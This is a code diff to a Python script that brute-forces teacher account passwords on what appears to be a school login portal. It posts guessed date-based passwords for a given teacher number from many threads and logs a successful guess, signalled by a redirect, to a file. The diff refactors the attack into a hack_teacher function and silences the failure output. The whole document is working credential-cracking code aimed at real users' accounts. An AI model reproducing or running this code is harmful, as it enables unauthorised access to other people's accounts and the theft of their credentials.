@@ -1,4 +1,3 @@
-import sys
 import threading
 
 import requests
@@ -9,10 +8,6 @@ headers = {
     'Content-Type': 'application/x-www-form-urlencoded',
 }
 
-if len(sys.argv) <= 1:
-    print('argv not has the teacher number')
-    exit()
-
 
 def log(msg):
     with open('pwd.txt', 'a+') as file:
@@ -21,22 +16,10 @@ def log(msg):
         file.write(msg)
 
 
-number = sys.argv[1]
-
-data = {
-    'IDToken0': '',
-    'IDToken1': number,
-    'IDToken2': '',
-    'IDButton': '登陆',
-    'goto': '',
-    'encoded': 'false',
-    'gx_charset': 'UTF-8',
-}
-
 LOCK = True
 
 
-def random_handle(X, Y):
+def random_handle(data, X, Y):
     # 随机三位
     global LOCK
     if not LOCK:
@@ -52,7 +35,8 @@ def random_handle(X, Y):
         data['IDToken2'] = PWD
         resp = requests.post(api, data=data, headers=headers, allow_redirects=False)
         if resp.status_code == 200:
-            print('user : %s\'s pwd is not %s' % (data['IDToken1'], PWD))
+            pass
+            # print('user : %s\'s pwd is not %s' % (data['IDToken1'], PWD))
         elif resp.status_code != 302:
             print('error with %s in %s:%s' % (resp.status_code, data['IDToken1'], PWD))
         else:
@@ -62,7 +46,7 @@ def random_handle(X, Y):
             return
 
 
-def date_handle(X):
+def date_handle(data, X):
     global LOCK
     if not LOCK:
         return
@@ -72,17 +56,23 @@ def date_handle(X):
             Y = '0' + str(y)
         else:
             Y = str(y)
-        t = threading.Thread(target=random_handle, args=(X, Y))
+        t = threading.Thread(target=random_handle, args=(data, X, Y))
         t.start()
 
 
-def crack_pwd():
+def hack_teacher(number):
+    data = {
+        'IDToken0': '',
+        'IDToken1': number,
+        'IDToken2': '',
+        'IDButton': '登陆',
+        'goto': '',
+        'encoded': 'false',
+        'gx_charset': 'UTF-8',
+    }
+
     # 月份个位
     for x in range(0, 10):
         X = str(x)
-        t = threading.Thread(target=date_handle, args=(X,))
+        t = threading.Thread(target=date_handle, args=(data, X,))
         t.start()
-
-
-crack_pwd()
-log('\nEND')
